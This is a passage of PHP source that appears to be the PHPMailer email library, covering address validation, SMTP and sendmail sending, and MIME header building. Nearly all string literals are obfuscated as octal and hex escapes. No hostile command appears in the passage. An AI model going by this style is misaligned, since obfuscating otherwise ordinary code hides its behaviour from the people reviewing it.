preg_match("\57\136\x5b\141\55\x7a\x41\55\132\60\x2d\71\x2e\x21\43\x24\45\46\47\x2a\53\x5c\57\x3d\77\136\x5f\140\x7b\x7c\x7d\176\x2d\x5d\53\x40\133\141\x2d\x7a\x41\x2d\132\x30\x2d\71\x5d\50\77\72\133\x61\55\172\101\x2d\132\x30\55\71\55\135\x7b\x30\54\x36\61\175" . "\x5b\141\55\172\101\55\132\x30\55\71\x5d\x29\77\x28\77\72\134\x2e\x5b\x61\x2d\x7a\101\55\132\x30\55\71\x5d\x28\77\72\x5b\x61\55\x7a\x41\55\132\x30\x2d\71\x2d\135\173\60\x2c\66\61\x7d\133\x61\x2d\172\x41\x2d\132\60\x2d\x39\135\51\x3f\x29\52\x24\57\163\104", $address); case "\156\x6f\x72\145\147\x65\x78": return strlen($address) >= 3 and strpos($address, "\100") >= 1 and strpos($address, "\100") != strlen($address) - 1; case "\160\150\160": default: return (bool) filter_var($address, FILTER_VALIDATE_EMAIL); } } public function idnSupported() { return function_exists("\151\x64\156\137\x74\x6f\x5f\x61\163\x63\151\x69") and function_exists("\155\x62\x5f\x63\x6f\156\x76\145\162\x74\137\145\x6e\x63\x6f\144\151\x6e\x67"); } public function punyencodeAddress($address) { if ($this->idnSupported() and !empty($this->CharSet) and ($pos = strrpos($address, "\x40")) !== false) { $domain = substr($address, ++$pos); if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) { $domain = mb_convert_encoding($domain, "\125\124\106\x2d\70", $this->CharSet); if (($punycode = defined("\x49\116\124\114\x5f\x49\x44\116\x41\x5f\x56\101\122\111\x41\116\x54\x5f\x55\124\x53\x34\x36") ? idn_to_ascii($domain, 0, INTL_IDNA_VARIANT_UTS46) : idn_to_ascii($domain)) !== false) { return substr($address, 0, $pos) . $punycode; } } } return $address; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (phpmailerException $exc) { $this->mailHeader = ''; $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function preSend() { try { $this->error_count = 0; $this->mailHeader = ''; foreach (array_merge($this->RecipientsQueue, $this->ReplyToQueue) as $params) { $params[1] = $this->punyencodeAddress($params[1]); call_user_func_array(array($this, "\141\144\144\x41\x6e\101\x64\x64\162\145\x73\163"), $params); } if (count($this->to) + count($this->cc) + count($this->bcc) < 1) { throw new phpmailerException($this->lang("\x70\x72\157\166\x69\x64\x65\x5f\x61\x64\x64\162\x65\163\x73"), self::STOP_CRITICAL); } foreach (array("\x46\x72\x6f\155", "\123\145\156\x64\x65\162", "\103\157\x6e\146\x69\162\155\x52\x65\141\144\151\156\x67\124\x6f") as $address_kind) { $this->{$address_kind} = trim($this->{$address_kind}); if (empty($this->{$address_kind})) { continue; } $this->{$address_kind} = $this->punyencodeAddress($this->{$address_kind}); if (!$this->validateAddress($this->{$address_kind})) { $error_message = $this->lang("\151\x6e\x76\x61\x6c\x69\x64\137\x61\144\x64\162\x65\163\x73") . "\x20\50\160\x75\x6e\171\x45\x6e\143\x6f\144\x65\51\40" . $this->{$address_kind}; $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new phpmailerException($error_message); } return false; } } if ($this->alternativeExists()) { $this->ContentType = "\x6d\165\x6c\x74\151\x70\x61\162\164\57\141\154\x74\x65\x72\156\141\x74\x69\166\145"; } $this->setMessageType(); if (!$this->AllowEmpty and empty($this->Body)) { throw new phpmailerException($this->lang("\x65\x6d\x70\x74\171\x5f\155\x65\163\163\141\147\x65"), self::STOP_CRITICAL); } $this->MIMEHeader = ''; $this->MIMEBody = $this->createBody(); $tempheaders = $this->MIMEHeader; $this->MIMEHeader = $this->createHeader(); $this->MIMEHeader .= $tempheaders; if ($this->Mailer == "\x6d\x61\151\154") { if (count($this->to) > 0) { $this->mailHeader .= $this->addrAppend("\x54\x6f", $this->to); } else { $this->mailHeader .= $this->headerLine("\x54\x6f", "\x75\156\144\151\x73\143\154\157\x73\x65\144\55\162\145\x63\x69\160\151\x65\156\x74\163\x3a\x3b"); } $this->mailHeader .= $this->headerLine("\x53\165\x62\x6a\145\143\164", $this->encodeHeader($this->secureHeader(trim($this->Subject)))); } if (!empty($this->DKIM_domain) and !empty($this->DKIM_selector) and (!empty($this->DKIM_private_string) or !empty($this->DKIM_private) and self::isPermittedPath($this->DKIM_private) and file_exists($this->DKIM_private))) { $header_dkim = $this->DKIM_Add($this->MIMEHeader . $this->mailHeader, $this->encodeHeader($this->secureHeader($this->Subject)), $this->MIMEBody); $this->MIMEHeader = rtrim($this->MIMEHeader, "\xd\xa\x20") . self::CRLF . str_replace("\xd\xa", "\xa", $header_dkim) . self::CRLF; } return true; } catch (phpmailerException $exc) { $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function postSend() { try { switch ($this->Mailer) { case "\163\145\156\144\x6d\x61\151\154": case "\x71\x6d\141\151\x6c": return $this->sendmailSend($this->MIMEHeader, $this->MIMEBody); case "\163\155\x74\160": return $this->smtpSend($this->MIMEHeader, $this->MIMEBody); case "\155\x61\151\154": return $this->mailSend($this->MIMEHeader, $this->MIMEBody); default: $sendMethod = $this->Mailer . "\123\x65\156\144"; if (method_exists($this, $sendMethod)) { return $this->{$sendMethod}($this->MIMEHeader, $this->MIMEBody); } return $this->mailSend($this->MIMEHeader, $this->MIMEBody); } } catch (phpmailerException $exc) { $this->setError($exc->getMessage()); $this->edebug($exc->getMessage()); if ($this->exceptions) { throw $exc; } } return false; } protected function sendmailSend($header, $body) { if (!empty($this->Sender) and self::isShellSafe($this->Sender)) { if ($this->Mailer == "\x71\155\141\151\x6c") { $sendmailFmt = "\x25\x73\x20\55\x66\45\163"; } else { $sendmailFmt = "\x25\163\40\x2d\x6f\151\x20\x2d\x66\x25\x73\x20\55\x74"; } } else { if ($this->Mailer == "\x71\155\141\x69\154") { $sendmailFmt = "\45\163"; } else { $sendmailFmt = "\x25\x73\x20\x2d\157\151\40\55\x74"; } } $sendmail = sprintf($sendmailFmt, escapeshellcmd($this->Sendmail), $this->Sender); if ($this->SingleTo) { foreach ($this->SingleToArray as $toAddr) { if (!@($mail = popen($sendmail, "\167"))) { throw new phpmailerException($this->lang("\145\170\145\143\x75\164\x65") . $this->Sendmail, self::STOP_CRITICAL); } fputs($mail, "\124\157\72\40" . $toAddr . "\xa"); fputs($mail, $header); fputs($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From); if ($result != 0) { throw new phpmailerException($this->lang("\x65\x78\145\x63\x75\x74\x65") . $this->Sendmail, self::STOP_CRITICAL); } } } else { if (!@($mail = popen($sendmail, "\x77"))) { throw new phpmailerException($this->lang("\x65\x78\x65\143\165\x74\x65") . $this->Sendmail, self::STOP_CRITICAL); } fputs($mail, $header); fputs($mail, $body); $result = pclose($mail); $this->doCallback($result == 0, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From); if ($result != 0) { throw new phpmailerException($this->lang("\145\x78\x65\x63\x75\164\x65") . $this->Sendmail, self::STOP_CRITICAL); } } return true; } protected static function isShellSafe($string) { if (escapeshellcmd($string) !== $string or !in_array(escapeshellarg($string), array("\x27{$string}\x27", "\42{$string}\42"))) { return false; } $length = strlen($string); for ($i = 0; $i < $length; $i++) { $c = $string[$i]; if (!ctype_alnum($c) && strpos("\100\137\x2d\x2e", $c) === false) { return false; } } return true; } protected static function isPermittedPath($path) { return !preg_match("\43\x5e\133\141\x2d\x7a\x5d\x2b\72\x2f\x2f\x23\x69", $path); } protected function mailSend($header, $body) { $toArr = array(); foreach ($this->to as $toaddr) { $toArr[] = $this->addrFormat($toaddr); } $to = implode("\x2c\40", $toArr); $params = null; if (!empty($this->Sender) and $this->validateAddress($this->Sender)) { if (self::isShellSafe($this->Sender)) { $params = sprintf("\55\x66\45\x73", $this->Sender); } } if (!empty($this->Sender) and !ini_get("\163\141\146\145\x5f\x6d\x6f\x64\x65") and $this->validateAddress($this->Sender)) { $old_from = ini_get("\163\145\156\x64\155\141\x69\x6c\x5f\x66\x72\x6f\155"); ini_set("\x73\x65\156\x64\x6d\141\x69\154\137\x66\x72\157\155", $this->Sender); } $result = false; if ($this->SingleTo and count($toArr) > 1) { foreach ($toArr as $toAddr) { $result = $this->mailPassthru($toAddr, $this->Subject, $body, $header, $params); $this->doCallback($result, array($toAddr), $this->cc, $this->bcc, $this->Subject, $body, $this->From); } } else { $result = $this->mailPassthru($to, $this->Subject, $body, $header, $params); $this->doCallback($result, $this->to, $this->cc, $this->bcc, $this->Subject, $body, $this->From); } if (isset($old_from)) { ini_set("\x73\x65\156\x64\x6d\141\151\154\x5f\146\162\157\x6d", $old_from); } if (!$result) { throw new phpmailerException($this->lang("\x69\x6e\x73\164\141\156\164\151\141\164\x65"), self::STOP_CRITICAL); } return true; } public function getSMTPInstance() { if (!is_object($this->smtp)) { $this->smtp = new SMTP(); } return $this->smtp; } protected function smtpSend($header, $body) { $bad_rcpt = array(); if (!$this->smtpConnect($this->SMTPOptions)) { throw new phpmailerException($this->lang("\163\155\x74\160\x5f\143\x6f\x6e\x6e\x65\x63\164\x5f\146\x61\151\154\x65\144"), self::STOP_CRITICAL); } if (!empty($this->Sender) and $this->validateAddress($this->Sender)) { $smtp_from = $this->Sender; } else { $smtp_from = $this->From; } if (!$this->smtp->mail($smtp_from)) { $this->setError($this->lang("\x66\162\157\x6d\x5f\146\141\151\154\x65\144") . $smtp_from . "\x20\72\x20" . implode("\x2c", $this->smtp->getError())); throw new phpmailerException($this->ErrorInfo, self::STOP_CRITICAL); } foreach (array($this->to, $this->cc, $this->bcc) as $togroup) { foreach ($togroup as $to) { if (!$this->smtp->recipient($to[0])) { $error = $this->smtp->getError(); $bad_rcpt[] = array("\x74\x6f" => $to[0], "\145\162\162\x6f\162" => $error["\x64\145\164\x61\151\x6c"]); $isSent = false; } else { $isSent = true; } $this->doCallback($isSent, array($to[0]), array(), array(), $this->Subject, $body, $this->From); } } if (count($this->all_recipients) > count($bad_rcpt) and !$this->smtp->data($header . $body)) { throw new phpmailerException($this->lang("\x64\141\x74\x61\137\x6e\157\164\137\141\143\143\145\x70\x74\x65\x64"), self::STOP_CRITICAL); } if ($this->SMTPKeepAlive) { $this->smtp->reset(); } else { $this->smtp->quit(); $this->smtp->close(); } if (count($bad_rcpt) > 0) { $errstr = ''; foreach ($bad_rcpt as $bad) { $errstr .= $bad["\164\x6f"] . "\72\x20" . $bad["\145\162\x72\157\x72"]; } throw new phpmailerException($this->lang("\x72\145\143\151\x70\151\x65\x6e\x74\163\137\146\x61\151\x6c\x65\144") . $errstr, self::STOP_CONTINUE); } return true; } public function smtpConnect($options = null) { if (is_null($this->smtp)) { $this->smtp = $this->getSMTPInstance(); } if (is_null($options)) { $options = $this->SMTPOptions; } if ($this->smtp->connected()) { return true; } $this->smtp->setTimeout($this->Timeout); $this->smtp->setDebugLevel($this->SMTPDebug); $this->smtp->setDebugOutput($this->Debugoutput); $this->smtp->setVerp($this->do_verp); $hosts = explode("\73", $this->Host); $lastexception = null; foreach ($hosts as $hostentry) { $hostinfo = array(); if (!preg_match("\x2f\136\x28\50\x73\163\154\174\164\154\x73\x29\72\134\x2f\134\57\51\52\x28\x5b\141\55\x7a\101\55\x5a\60\x2d\x39\134\x2e\x2d\x5d\x2a\x7c\134\133\x5b\141\x2d\x66\x41\55\106\60\x2d\x39\72\x5d\53\x5c\135\51\x3a\x3f\50\x5b\60\x2d\x39\x5d\x2a\51\44\x2f", trim($hostentry), $hostinfo)) { $this->edebug("\111\x67\156\x6f\x72\x69\156\147\40\151\156\166\141\x6c\151\x64\40\x68\157\163\x74\72\40" . $hostentry); continue; } $prefix = ''; $secure = $this->SMTPSecure; $tls = $this->SMTPSecure == "\164\154\x73"; if ("\x73\x73\154" == $hostinfo[2] or '' == $hostinfo[2] and "\163\x73\x6c" == $this->SMTPSecure) { $prefix = "\163\163\x6c\72\57\57"; $tls = false; $secure = "\163\163\x6c"; } elseif ($hostinfo[2] == "\x74\154\x73") { $tls = true; $secure = "\164\x6c\x73"; } $sslext = defined("\x4f\120\x45\116\x53\123\x4c\137\101\x4c\107\x4f\x5f\x53\110\101\61"); if ("\x74\x6c\x73" === $secure or "\163\163\x6c" === $secure) { if (!$sslext) { throw new phpmailerException($this->lang("\x65\170\164\145\156\x73\151\x6f\x6e\x5f\x6d\151\x73\163\x69\156\147") . "\x6f\x70\x65\156\x73\x73\154", self::STOP_CRITICAL); } } $host = $hostinfo[3]; $port = $this->Port; $tport = (int) $hostinfo[4]; if ($tport > 0 and $tport < 65536) { $port = $tport; } if ($this->smtp->connect($prefix . $host, $port, $this->Timeout, $options)) { try { if ($this->Helo) { $hello = $this->Helo; } else { $hello = $this->serverHostname(); } $this->smtp->hello($hello); if ($this->SMTPAutoTLS and $sslext and $secure != "\x73\163\154" and $this->smtp->getServerExt("\x53\124\x41\122\124\x54\114\123")) { $tls = true; } if ($tls) { if (!$this->smtp->startTLS()) { throw new phpmailerException($this->lang("\x63\x6f\x6e\x6e\145\143\x74\137\150\x6f\x73\x74")); } $this->smtp->hello($hello); } if ($this->SMTPAuth) { if (!$this->smtp->authenticate($this->Username, $this->Password, $this->AuthType, $this->Realm, $this->Workstation)) { throw new phpmailerException($this->lang("\x61\165\164\150\145\x6e\x74\x69\143\x61\x74\145")); } } return true; } catch (phpmailerException $exc) { $lastexception = $exc; $this->edebug($exc->getMessage()); $this->smtp->quit(); } } } $this->smtp->close(); if ($this->exceptions and !is_null($lastexception)) { throw $lastexception; } return false; } public function smtpClose() { if (is_a($this->smtp, "\123\x4d\x54\x50")) { if ($this->smtp->connected()) { $this->smtp->quit(); $this->smtp->close(); } } } public function setLanguage($langcode = "\x65\x6e", $lang_path = '') { $renamed_langcodes = array("\x62\x72" => "\x70\164\137\x62\x72", "\143\172" => "\143\163", "\144\153" => "\x64\141", "\156\157" => "\x6e\142", "\x73\145" => "\163\x76", "\x73\162" => "\x72\x73"); if (isset($renamed_langcodes[$langcode])) { $langcode = $renamed_langcodes[$langcode]; } $PHPMAILER_LANG = array("\141\x75\x74\x68\145\156\164\151\x63\141\164\x65" => "\123\115\x54\120\40\x45\162\x72\x6f\162\72\x20\103\x6f\165\x6c\144\40\156\x6f\164\x20\x61\x75\x74\x68\x65\156\x74\x69\x63\141\x74\145\56", "\143\x6f\156\156\145\x63\x74\137\x68\x6f\163\x74" => "\x53\115\124\x50\x20\x45\x72\x72\157\x72\72\x20\x43\157\x75\154\144\40\156\157\164\40\x63\x6f\156\156\x65\x63\x74\x20\164\x6f\40\x53\x4d\124\120\x20\150\x6f\163\164\x2e", "\x64\141\x74\x61\137\x6e\x6f\x74\x5f\141\143\x63\145\160\164\145\144" => "\123\x4d\x54\120\40\x45\162\x72\x6f\x72\x3a\x20\144\141\x74\x61\x20\x6e\x6f\x74\x20\141\x63\143\145\160\164\145\x64\56", "\145\155\160\x74\171\x5f\155\145\x73\163\x61\x67\145" => "\x4d\x65\163\x73\x61\147\145\40\x62\x6f\144\171\x20\x65\x6d\x70\x74\x79", "\145\x6e\x63\157\x64\x69\156\147" => "\x55\156\153\x6e\157\167\156\x20\145\156\x63\157\144\x69\156\x67\72\40", "\145\x78\145\143\x75\x74\x65" => "\103\x6f\165\154\144\40\x6e\157\x74\40\x65\170\145\143\165\x74\x65\x3a\40", "\x66\x69\154\145\137\141\143\143\x65\x73\163" => "\103\x6f\165\x6c\x64\x20\156\157\164\x20\x61\x63\x63\145\x73\x73\x20\146\x69\x6c\145\x3a\x20", "\146\x69\x6c\145\137\x6f\x70\145\156" => "\x46\151\154\145\x20\105\162\x72\157\x72\x3a\40\x43\x6f\x75\154\144\40\156\x6f\x74\x20\x6f\160\x65\156\40\146\x69\x6c\145\x3a\40", "\x66\x72\157\155\x5f\x66\141\151\x6c\x65\x64" => "\124\150\145\40\x66\x6f\154\154\157\x77\x69\x6e\147\40\106\x72\x6f\155\40\141\144\144\x72\145\x73\x73\40\146\141\151\154\x65\144\72\x20", "\151\x6e\x73\x74\141\156\164\151\x61\x74\145" => "\x43\157\x75\x6c\144\40\156\x6f\x74\40\x69\156\x73\x74\141\156\164\x69\x61\164\145\40\x6d\141\x69\154\x20\x66\x75\x6e\143\164\x69\x6f\156\56", "\x69\x6e\x76\x61\154\151\x64\137\x61\144\x64\162\x65\x73\x73" => "\x49\x6e\x76\141\154\151\144\x20\141\144\144\x72\x65\163\x73\72\40", "\x6d\x61\x69\x6c\145\x72\x5f\156\157\x74\x5f\x73\165\160\x70\x6f\162\164\145\144" => "\x20\155\141\151\x6c\145\x72\x20\x69\x73\40\156\x6f\164\x20\163\x75\x70\160\x6f\162\164\x65\x64\56", "\160\162\x6f\x76\151\x64\x65\x5f\141\144\144\x72\x65\x73\x73" => "\131\157\x75\40\x6d\165\163\x74\x20\160\x72\x6f\x76\151\144\145\40\x61\164\40\x6c\x65\141\163\x74\x20\x6f\x6e\x65\40\x72\x65\x63\151\x70\x69\145\x6e\164\x20\145\155\141\151\x6c\40\x61\x64\x64\x72\145\163\x73\x2e", "\162\x65\x63\151\160\x69\x65\156\x74\x73\x5f\146\x61\151\x6c\x65\x64" => "\123\x4d\124\x50\40\105\x72\162\x6f\x72\72\40\x54\x68\145\x20\146\x6f\154\154\x6f\167\151\x6e\147\40\162\x65\143\151\160\x69\145\156\x74\163\40\146\x61\151\x6c\145\x64\x3a\x20", "\x73\151\x67\156\151\x6e\147" => "\x53\151\147\156\151\x6e\147\x20\105\x72\162\x6f\162\x3a\40", "\x73\x6d\164\160\x5f\x63\x6f\x6e\156\145\x63\164\x5f\x66\x61\x69\x6c\x65\144" => "\x53\115\x54\120\40\143\x6f\156\156\x65\143\164\x28\51\x20\146\141\x69\x6c\x65\144\56", "\x73\x6d\x74\160\x5f\145\x72\162\x6f\162" => "\x53\x4d\x54\x50\40\163\x65\162\x76\x65\162\40\145\x72\162\157\162\72\40", "\166\141\x72\151\x61\x62\x6c\x65\137\x73\145\x74" => "\103\x61\156\x6e\x6f\164\x20\163\145\164\40\157\x72\40\162\x65\163\x65\x74\40\x76\x61\x72\151\141\142\x6c\x65\x3a\x20", "\145\x78\164\x65\x6e\x73\151\x6f\x6e\137\x6d\x69\163\163\x69\x6e\147" => "\105\170\164\145\x6e\x73\151\x6f\156\40\x6d\x69\163\x73\151\x6e\x67\72\x20"); if (empty($lang_path)) { $lang_path = dirname(__FILE__) . DIRECTORY_SEPARATOR . "\x6c\141\156\147\x75\x61\x67\145" . DIRECTORY_SEPARATOR; } if (!preg_match("\x2f\136\x5b\x61\x2d\x7a\135\x7b\62\175\x28\77\72\137\x5b\141\x2d\x7a\x41\x2d\132\x5d\x7b\x32\175\51\77\44\x2f", $langcode)) { $langcode = "\x65\x6e"; } $foundlang = true; $lang_file = $lang_path . "\x70\x68\x70\x6d\141\x69\x6c\145\x72\56\154\141\156\147\55" . $langcode . "\56\x70\x68\160"; if ($langcode != "\x65\156") { if (!self::isPermittedPath($lang_file) or !is_readable($lang_file)) { $foundlang = false; } else { $foundlang = (include $lang_file); } } $this->language = $PHPMAILER_LANG; return (bool) $foundlang; } public function getTranslations() { return $this->language; } public function addrAppend($type, $addr) { $addresses = array(); foreach ($addr as $address) { $addresses[] = $this->addrFormat($address); } return $type . "\x3a\x20" . implode("\x2c\x20", $addresses) . $this->LE; } public function addrFormat($addr) { if (empty($addr[1])) { return $this->secureHeader($addr[0]); } else { return $this->encodeHeader($this->secureHeader($addr[1]), "\160\150\x72\141\x73\x65") . "\x20\74" . $this->secureHeader($addr[0]) . "\x3e"; } } public function wrapText($message, $length, $qp_mode = false) { if ($qp_mode) { $soft_break = sprintf("\x20\x3d\45\163", $this->LE); } else { $soft_break = $this->LE; } $is_utf8 = strtolower($this->CharSet) == "\x75\x74\146\x2d\x38"; $lelen = strlen($this->LE); $crlflen = strlen(self::CRLF); $message = $this->fixEOL($message); if (substr($message, -$lelen) == $this->LE) { $message = substr($message, 0, -$lelen); } $lines = explode($this->LE, $message); $message = ''; foreach ($lines as $line) { $words = explode("\x20", $line); $buf = ''; $firstword = true; foreach ($words as $word) { if ($qp_mode and strlen($word) > $length) { $space_left = $length - strlen($buf) - $crlflen; if (!$firstword) { if ($space_left > 20) { $len = $space_left; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif (substr($word, $len - 1, 1) == "\x3d") { $len--; } elseif (substr($word, $len - 2, 1) == "\75") { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); $buf .= "\x20" . $part; $message .= $buf . sprintf("\75\x25\163", self::CRLF); } else { $message .= $buf . $soft_break; } $buf = ''; } while (strlen($word) > 0) { if ($length <= 0) { break; } $len = $length; if ($is_utf8) { $len = $this->utf8CharBoundary($word, $len); } elseif (substr($word, $len - 1, 1) == "\75") { $len--; } elseif (substr($word, $len - 2, 1) == "\x3d") { $len -= 2; } $part = substr($word, 0, $len); $word = substr($word, $len); if (strlen($word) > 0) { $message .= $part . sprintf("\75\45\163", self::CRLF); } else { $buf = $part; } } } else { $buf_o = $buf; if (!$firstword) { $buf .= "\40"; } $buf .= $word; if (strlen($buf) > $length and $buf_o != '') { $message .= $buf_o . $soft_break; $buf = $word; } } $firstword = false; } $message .= $buf . self::CRLF; } return $message; } public function utf8CharBoundary($encodedText, $maxLength) { $foundSplitPos = false; $lookBack = 3; while (!$foundSplitPos) { $lastChunk = substr($encodedText, $maxLength - $lookBack, $lookBack); $encodedCharPos = strpos($lastChunk, "\x3d"); if (false !== $encodedCharPos) { $hex = substr($encodedText, $maxLength - $lookBack + $encodedCharPos + 1, 2); $dec = hexdec($hex); if ($dec < 128) { if ($encodedCharPos > 0) { $maxLength = $maxLength - ($lookBack - $encodedCharPos); } $foundSplitPos = true; } elseif ($dec >= 192) { $maxLength = $maxLength - ($lookBack - $encodedCharPos); $foundSplitPos = true; } elseif ($dec < 192) { $lookBack += 3; } } else { $foundSplitPos = true; } } return $maxLength; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case "\x61\x6c\164": case "\141\x6c\164\137\x69\x6e\154\151\156\145": case "\x61\x6c\x74\x5f\141\x74\164\141\x63\150": case "\x61\x6c\x74\x5f\151\156\154\x69\156\145\x5f\141\164\164\141\143\x68": $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $result = ''; $result .= $this->headerLine("\x44\x61\164\x65", $this->MessageDate == '' ? self::rfcDate() : $this->MessageDate); if ($this->SingleTo) { if ($this->Mailer != "\155\x61\x69\154") { foreach ($this->to as $toaddr) { $this->SingleToArray[] = $this->addrFormat($toaddr); } } } else { if (count($this->to) > 0) { if ($this->Mailer != "\x6d\x61\x69\x6c") { $result .= $this->addrAppend("\124\157", $this->to); } } elseif (count($this->cc) == 0) { $result .= $this->headerLine("\124\x6f", "\165\x6e\144\151\163\x63\154\157\x73\145\x64\55\162\145\143\x69\160\151\145\x6e\x74\x73\72\73"); } } $result .= $this->addrAppend("\x46\162\157\155", array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $result .= $this->addrAppend("\103\143", $this->cc); } if (($this->Mailer == "\x73\x65\156\x64\155\x61\151\x6c" or $this->Mailer == "\x71\155\x61\151\x6c" or $this->Mailer == "\155\x61\x69\154") and count($this->bcc) > 0) { $result .= $this->addrAppend("\102\x63\x63", $this->bcc); } if (count($this->ReplyTo) > 0) { $result .= $this->addrAppend("\122\145\160\154\171\x2d\124\x6f", $this->ReplyTo); } if ($this->Mailer != "\155\x61\x69\154") { $result .= $this->headerLine("\x53\x75\x62\152\145\143\164", $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' != $this->MessageID and preg_match("\57\136\x3c\x2e\x2a\100\x2e\52\x3e\44\57", $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf("\x3c\x25\x73\x40\45\163\x3e", $this->uniqueid, $this->serverHostname()); } $result .= $this->headerLine("\x4d\145\x73\163\x61\147\145\55\x49\x44", $this->lastMessageID); if (!is_null($this->Priority)) { $result .= $this->headerLine("\130\55\120\x72\151\157\162\151\x74\171", $this->Priority); } if ($this->XMailer == '') { $result .= $this->headerLine("\x58\x2d\x4d\141\151\x6c\x65\x72", "\x50\110\x50\x4d\141\x69\x6c\145\x72\40" . $this->Version . "\40\x28\x68\x74\x74\160\x73\x3a\x2f\57\x67\151\x74\x68\165\x62\x2e\143\x6f\155\57\x50\110\x50\115\x61\x69\154\145\x72\57\120\110\x50\x4d\141\151\154\x65\162\x29"); } else { $myXmailer = trim($this->XMailer); if ($myXmailer) { $result .= $this->headerLine("\130\55\x4d\141\x69\154\x65\162", $myXmailer); } } if ($this->ConfirmReadingTo != '') { $result .= $this->headerLine("\104\x69\x73\x70\x6f\163\151\164\x69\157\156\55\x4e\157\164\151\146\x69\x63\141\x74\151\157\156\x2d\x54\x6f", "\x3c" . $this->ConfirmReadingTo . "\76"); } foreach ($this->CustomHeader as $header) { $result .= $this->headerLine(trim($header[0]), $this->encodeHeader(trim($header[1]))); } if (!$this->sign_key_file) { $result .= $this->headerLine("\x4d\x49\115\x45\55\x56\145\162\x73\151\x6f\156", "\x31\x2e\x30"); $result .= $this->getMailMIME(); } return $result; } public function getMailMIME() { $result = ''; $ismultipart = true; switch ($this->message_type) { case "\x69\156\154\x69\x6e\145": $result .= $this->headerLine("\x43\x6f\156\164\145\156\x74\x2d\x54\x79\160\x65", "\155\165\154\x74\151\x70\141\x72\164\x2f\x72\x65\x6c\x61\164\x65\x64\73"); $result .= $this->textLine("\11\142\157\x75\156\144\x61\x72\171\x3d\42" . $this->boundary[1] . "\x22"); break; case "\x61\164\x74\141\x63\150": case "\x69\x6e\154\x69\x6e\x65\137\141\x74\x74\x61\143\150": case "\141\154\x74\x5f\x61\164\164\x61\143\x68": case "\141\x6c\x74\137\151\156\154\151\x6e\145\x5f\x61\x74\164\x61\143\x68": $result .= $this->headerLine("\x43\x6f\156\164\x65\156\x74\55\x54\171\160\145", "\x6d\165\154\164\151\x70\141\162\164\x2f\155\151\170\x65\x64\x3b"); $result .= $this->textLine("\11\142\x6f\165\156\144\141\x72\x79\x3d\x22" . $this->boundary[1] . "\x22"); break; case "\x61\154\x74": case "\x61\x6c\164\137\x69\x6e\x6c\x69\156\x65": $result .= $this->headerLine("\x43\157\156\164\145\x6e\x74\55\124\x79\x70\145", "\155\165\154\164\151\160\141\x72\x74\x2f\141\154\164\145\162\156\x61\x74\151\166\145\73"); $result .= $this->textLine("\x9\x62\x6f\x75\x6e\x64\x61\x72\x79\x3d\x22" . $this->boundary[1] . "\x22"); break; default: $result .= $this->textLine("\x43\x6f\156\164\145\x6e\x74\x2d\x54\171\x70\x65\x3a\x20" . $this->ContentType . "\x3b\40\143\150\141\x72\x73\x65\x74\75" . $this->CharSet); $ismultipart = false; break; } if ($this->Encoding != "\x37\x62\151\164") { if ($ismultipart) { if ($this->Encoding == "\x38\x62\151\164") { $result .= $this->headerLine("\x43\x6f\x6e\x74\145\156\x74\55\124\162\x61\156\163\146\x65\162\x2d\105\156\x63\157\x64\151\x6e\147", "\x38\x62\151\164"); } } else { $result .= $this->headerLine("\x43\x6f\156\164\x65\x6e\x74\55\x54\x72\141\156\163\x66\x65\162\x2d\x45\x6e\x63\157\x64\x69\x6e\x67", $this->Encoding); } } if ($this->Mailer != "\155\141\151\x6c") { $result .= $this->LE; } return $result; } public function getSentMIMEMessage() { return rtrim($this->MIMEHeader . $this->mailHeader, "\xa\15") . self::CRLF . self::CRLF . $this->MIMEBody; } protected function generateId() { return md5(uniqid(time())); } public function createBody() { $body = ''; $this->uniqueid = $this->generateId(); $this->boundary[1] = "\x62\61\137" . $this->uniqueid; $this->boundary[2] = "\x62\x32\137" . $this->uniqueid; $this->boundary[3] = "\x62\x33\137" . $this->uniqueid; if ($this->sign_key_file) { $body .= $this->getMailMIME() . $this->LE; } $this->setWordWrap(); $bodyEncoding = $this->Encoding; $bodyCharSet = $this->CharSet; if ($bodyEncoding == "\70\x62\151\x74" and !$this->has8bitChars($this->Body)) { $bodyEncoding = "\67\142\151\x74"; $bodyCharSet = "\x75\x73\55\x61\x73\143\x69\x69"; } if ("\x62\141\163\x65\66\x34" != $this->Encoding and self::hasLineLongerThanMax($this->Body)) { $bodyEncoding = "\x71\x75\x6f\x74\145\144\x2d\160\x72\x69\x6e\x74\x61\x62\x6c\x65"; } $altBodyEncoding = $this->Encoding; $altBodyCharSet = $this->CharSet; if ($altBodyEncoding == "\70\142\151\164" and !$this->has8bitChars($this->AltBody)) { $altBodyEncoding = "\x37\142\x69\164"; $altBodyCharSet = "\x75\x73\x2d\141\x73\143\x69\x69"; } if ("\x62\x61\x73\145\66\64" != $altBodyEncoding and self::hasLineLongerThanMax($this->AltBody)) { $altBodyEncoding = "\161\165\x6f\164\145\x64\55\x70\162\151\156\164\141\142\154\145"; } $mimepre = "\x54\150\x69\x73\40\151\x73\x20\141\x20\x6d\x75\154\164\x69\55\160\141\162\164\x20\155\x65\x73\x73\141\x67\145\40\151\x6e\x20\115\111\x4d\105\40\x66\x6f\x72\155\141\164\56" . $this->LE . $this->LE; switch ($this->message_type) { case "\x69\156\154\x69\x6e\x65": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= $this->LE . $this->LE; $body .= $this->attachAll("\151\156\154\151\x6e\x65", $this->boundary[1]); break; case "\x61\164\164\x61\x63\150": $body .= $mimepre; $body .= $this->getBoundary($this->boundary[1], $bodyCharSet, '', $bodyEncoding); $body .= $this->encodeString($this->Body, $bodyEncoding); $body .= 